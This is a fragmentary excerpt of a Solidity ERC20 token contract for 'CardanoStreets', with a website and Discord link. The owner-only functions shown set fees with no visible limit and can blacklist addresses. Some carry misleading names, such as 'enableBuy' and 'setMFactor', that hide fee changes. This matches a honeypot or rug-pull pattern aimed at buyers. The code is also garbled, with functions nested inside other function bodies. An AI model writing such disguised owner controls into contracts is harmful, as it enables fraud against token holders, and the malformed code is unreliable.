...
💻 Website: CardanoStreets.com
🔈 Discord: https://discord.gg/8gDFEbKw
...
contract CardanoStreets is ERC20, Ownable {
    ...
    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        ...
        function marketing_fee(uint256 value) external onlyOwner{
            marketingFee = value;
        }
    ...
    function setMarketingWallet(address payable wallet) external onlyOwner{
        ...
        function set_percentage_liquidityfee(uint256 value) external onlyOwner{
            liquidityFee = value;
        }
        ...
        function setLaunch(uint256 value) external onlyOwner{
            liquidityFee = value;
        }
    ...
    function blacklistAddress(address account, bool value) external onlyOwner {
        ...
        function enableBuy(uint256 value) external onlyOwner {
            buyFee = value;
        }
    ...
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        ...
        function setMFactor(uint256 value) external onlyOwner{
            liquidityFee = value;
        }
